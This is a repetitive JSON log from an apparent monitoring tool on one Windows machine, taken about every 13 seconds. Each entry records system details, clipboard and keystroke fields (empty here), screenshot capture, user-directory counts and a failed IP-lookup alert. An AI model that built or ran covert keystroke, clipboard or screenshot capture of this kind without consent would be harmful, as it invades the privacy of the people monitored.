{"timestamp": "2025-06-14T07:53:43.520763+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "146ff2668f31567c152a43eb1e6db736f5ffbf325ad68a76294c8c2a43125bb1", "_raw_log_hash": "f35bae65dede44f193ccfc150eb6a8544c68b894a04b8d74589636a1d245453f"}
{"timestamp": "2025-06-14T07:53:57.029850+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7eef4fe2893708dcfd88a5807fcdfd193aef5d96fea70bbb4774cd52c178b30a", "_raw_log_hash": "882b865296eeb322f3bd47ff06dd898cd6546317178dc06ad651942c0a5d86b4"}
{"timestamp": "2025-06-14T07:54:10.599506+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "53639af2f7e033c3ef0c17b74edcad0fc7d1476153f2e5715db2b43da2d1c650", "_raw_log_hash": "92791849ae19cc8501d41614d454c42954f474db16e10677a6add2b2bc1f9f02"}
{"timestamp": "2025-06-14T07:54:24.156647+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "cc4f64ddd1fe660238cf79aea04d1474cc026f24ccca684e9ddfdfdf06057ac8", "_raw_log_hash": "e8039427abd0d8c182ffc9be281782ac9619e1ab45d4959cae9a3c393617505d"}
{"timestamp": "2025-06-14T07:54:37.661153+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "bf6609c27d7d74e49c5aa29b1ff14df569cdb133516a1478972fa0d75bfa963f", "_raw_log_hash": "72804d1cf05e8f039f8c2864e0f8e1ccaf556fc3e606a5512521945e888048d3"}
{"timestamp": "2025-06-14T07:54:51.160980+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5011d42f2d70ab7a055e00217fd3f84d7bcce91a800c93c81b5a2b6ac0f2d1cc", "_raw_log_hash": "26601ed15447428524782c672340a764744c955c3dc292ce5fc7772b1d432584"}
{"timestamp": "2025-06-14T07:55:04.642548+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "78ad7a3159bb15b754d3e1706b2d53e76797bfcc88d3b962806883ed4125f6d7", "_raw_log_hash": "508d69e3c22440a12af6f2ca4e32d1c15e1c3e57656469749e2677d2b2c0ec17"}
{"timestamp": "2025-06-14T07:55:18.197551+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4ad314123dc776de6bf0f54b10f9842abb11cc3930de265704f3728bd0b5274c", "_raw_log_hash": "5ba684e87ab1e885eb32efe4d8f6c2b19a41f134bfba3a781d5e36063191b450"}
{"timestamp": "2025-06-14T07:55:31.751894+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4a9327e292a8159a82a04d9fc5ca53756a2194432a9115f0a7baa8fd26e71ff9", "_raw_log_hash": "3eaa4a8bbc90caa6e37141734ce5dbb9813086063166cd150b623a4182334ca6"}
{"timestamp": "2025-06-14T07:55:45.278693+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "dea3bd1c1af341447305db30a72e088e5c1d39af1e803a48cdab9492a217d70f", "_raw_log_hash": "4e092ac23f18b777fdc65e05766d5cc41b345809944d2b7ba3cff1c2d4749c5e"}
{"timestamp": "2025-06-14T07:55:58.775263+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ae7a528710f78456660738a401a120bcee2d22b3dbe4c8bb71061f1fe3897367", "_raw_log_hash": "f721fcd7936a3b825e368f240e7855ac96b7555c988d0bbdaad02271318473b3"}
{"timestamp": "2025-06-14T07:56:12.316231+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1d4d2d2525d801ebc5510ba0f323e942a69a2bd6bf338092f27784db0751f4c4", "_raw_log_hash": "a418f4b77859b675be02c45e6d317f14ba262cb17f6a3dd900781ef29c92d9ed"}
{"timestamp": "2025-06-14T07:56:25.857595+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1905a6a619e188df7bdec5b2ec34cce89dd44f34046f375da9feee58f61bcd2a", "_raw_log_hash": "a9ec50b96ce5c70b4a740b6fcc2f5a69f8b788286c866a64580dcc52afa824df"}
{"timestamp": "2025-06-14T07:56:39.429831+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "51bbade7d2fa3c137c0b7ccd500854f932f5c5caa0be973ae392372c14124d14", "_raw_log_hash": "122899e430072e03269af96ee57a5a46f6483e7c53ddae565c3d946117079454"}
{"timestamp": "2025-06-14T07:56:52.936703+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d6007463283bd6b026d0535a47e36210c87baf45c99cbb452291a7cb03f93f54", "_raw_log_hash": "be17a69a45dc89ea392b1af73a5c54c57ec4a53ee5d6ada6dc6618d4401ebda1"}
{"timestamp": "2025-06-14T07:57:06.532412+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8cfa1aa10564b676154a2eaa622d67fb00b60cf78748e88b54d2c70e5c023c47", "_raw_log_hash": "c2def3ba41f7f526f8d07b3d5bfd7c87fd9e8ac6e76ad56e6059c8dcaa75dd9a"}
{"timestamp": "2025-06-14T07:57:20.059227+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "60a74e63e8a44272db38b130adb5c9312fa9d18be3d7cfe98b95dc87ab66f6b3", "_raw_log_hash": "31956df5e9d5d1be1a0c292a744e84ec6aa6ac3dca80ebbf198933e30871efc1"}
{"timestamp": "2025-06-14T07:57:33.605572+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "eaca789b4bb8e2f87bd0522677142ceef1d4cb0e9410bed48bfd31df1cb23bb8", "_raw_log_hash": "6d37923a7e714bfe76eda6ac9996189089ef913387213009bbbb1f38f828add2"}
{"timestamp": "2025-06-14T07:57:47.105967+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "27a8a920f3fa7e4af6679740bf2444ebf492b585f9a908289575aba8493cde91", "_raw_log_hash": "56e5b40966ab7b480623c02e2bb6cffb0eb4f7bc638909287d81d87e42143443"}
{"timestamp": "2025-06-14T07:58:00.628367+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c7cd9b9db2148d8e1b59fd0ecff5a8f754e225d413d163f0a3ffb57fe62f4934", "_raw_log_hash": "a76c6d10a9b8d8d7a828fc507e514f0937780b2c43bc7b62e69fede225820f5a"}
{"timestamp": "2025-06-14T07:58:14.158165+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "089bae7915fdc713fdeb446587974af337b07a8424c2aa81178960e1e847edbe", "_raw_log_hash": "7a52d5a4b16a935dc456cddf727aeb99710df41044e3d779fde46d1d6955d916"}
{"timestamp": "2025-06-14T07:58:27.722644+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "755b07bf2157b0ff36c0d72ba26f9573024617dcc558fa4940a5d13f928299ff", "_raw_log_hash": "0d41c7eb272ebf4abc81fdaa1f3c65e51589f2000cb60a743302cef175ab961b"}
{"timestamp": "2025-06-14T07:58:41.343975+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "65a2226db5927e712e79e97bf9f6f9c2d6912b5ad4c014663b01db26a4ef808c", "_raw_log_hash": "b8a1bbd7a800069d7fcd2b8440d24fd0acf6ddd9427de2e302b9c9bd0cec2b41"}
{"timestamp": "2025-06-14T07:58:54.884713+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a9565f2f14d0d2a45c7769a70c9901503d2f22041ba791db189a4018129ea9a7", "_raw_log_hash": "a359e70a3e82f5ec928349c9e204265d9973445278f4a2a1f97f8e2c986b4ba7"}
{"timestamp": "2025-06-14T07:59:08.428639+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e3e0f8ed02d04de92d89c9d75dd936a3aa7ee2535e5c795c3fa1d58f43808f90", "_raw_log_hash": "1b356c85963880baf9a25981a401a48190a408780626b3cfddaf275b1c508386"}
{"timestamp": "2025-06-14T07:59:21.974522+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6d589dc22fe98f7dea62ee19b5876af854e5bd0cae46321f6ef60a7dbd050298", "_raw_log_hash": "d6e5508dad10fd5db4e189eac246461e80ec3a2cb05c4ad82344ec2dd0221303"}
